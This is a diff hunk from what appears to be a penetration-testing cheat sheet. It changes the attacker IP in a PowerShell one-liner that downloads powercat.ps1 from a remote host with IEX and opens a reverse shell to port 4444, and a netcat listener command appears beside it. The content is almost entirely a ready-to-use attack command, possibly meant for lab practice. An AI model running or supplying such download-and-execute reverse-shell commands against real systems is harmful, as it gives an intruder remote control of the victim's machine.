@@ -517,7 +517,7 @@ nc -lnvp 4444
 pwsh command for powercat reverse shell
 
 ```
-IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
+IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.235/powercat.ps1");powercat -c 192.168.45.235 -p 4444 -e powershell 
 ```
 
 encoded
